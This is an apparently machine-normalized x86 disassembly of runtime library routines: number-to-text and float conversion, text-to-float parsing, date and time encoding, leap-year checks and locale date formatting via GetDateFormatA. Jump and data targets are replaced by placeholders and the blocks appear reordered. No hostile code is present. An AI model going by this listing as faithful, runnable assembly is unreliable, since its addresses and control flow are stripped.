mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408628
mov edx esi
xchg edx eax
call sub_4045b8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408af4
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408b38
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408e0c
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408c37
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408c41
call sub_408c37
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408af4
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408c9d
call sub_408c37
call sub_408c2e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408c2e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408af4
retn
xor ecx ecx
sub_408cd9
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408c2e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408c2e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408d3e
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408d92
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408cd9
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408e0c
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_408e39
jmp r-xdata
call sub_408f5b
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_408e39
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d80
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_408f5b
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409038
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4090ef
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4090fa
neg edx
mov ecx esi
call sub_4090fa
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4090ef
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409116
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d80
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4090fa
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409116
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40914c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408b38
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40405c
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40917c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408b38
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40405c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4091c8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40442c
mov edx esp
xor ecx ecx
call sub_409038
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4091f4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40442c
mov edx esp
xor ecx ecx
call sub_409038
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40923c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409280
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4092f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40923c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407968
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407968
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407968
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40934c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409388
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_40934c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409450
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40923c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407968
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407968
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407968
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40934c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_40959c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409450
pop esi
pop ecx
pop ebp
retn 0x8
sub_4095bc
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40923c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4095f8
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028b8
sub_40963c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_40422c
mov edx eax
mov eax ebx
call sub_4095f8
pop ecx
pop ebx
pop ebp
retn
sub_40965c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408628
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4095f8
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4096a8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_4096d4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_40959c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40970c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4092f0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40974c
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f6c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4098a1
lea eax [ ebp - 0x118 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041dc
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_40422c
mov edx eax
mov eax [ ebx ]
call sub_40bc90
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40be04
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_40448c
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40bda0
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404164
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40be04
mov ecx eax
mov eax ebx
mov edx esi
call sub_40405c
sub_4098b4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f6c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409999
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041dc
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_40422c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_40448c
sub_4099bc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a144
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f90
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40be84
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40be64
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4095f8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40be84
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4095f8
pop ecx
mov al [ eax + lookup_table_409a9f ]
jmp [ eax * 4 + jump_table_409ad8 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_4096a8
pop ecx
push ebp
call sub_4096d4
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_4096a8
pop ecx
push ebp
call sub_4096d4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40974c
pop ecx
mov eax [ ebp - 0x24 ]
call sub_40963c
pop ecx
jmp r-xdata
push ebp
call sub_4096a8
pop ecx
push ebp
call sub_4096d4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_4098b4
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40963c
pop ecx
jmp r-xdata
push ebp
call sub_4096a8
pop ecx
push ebp
call sub_4096d4
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4096a8
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4096a8
pop ecx
push ebp
call sub_40970c
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_4096a8
pop ecx
push ebp
call sub_40970c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_4096a8
pop ecx
push ebp
call sub_40970c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
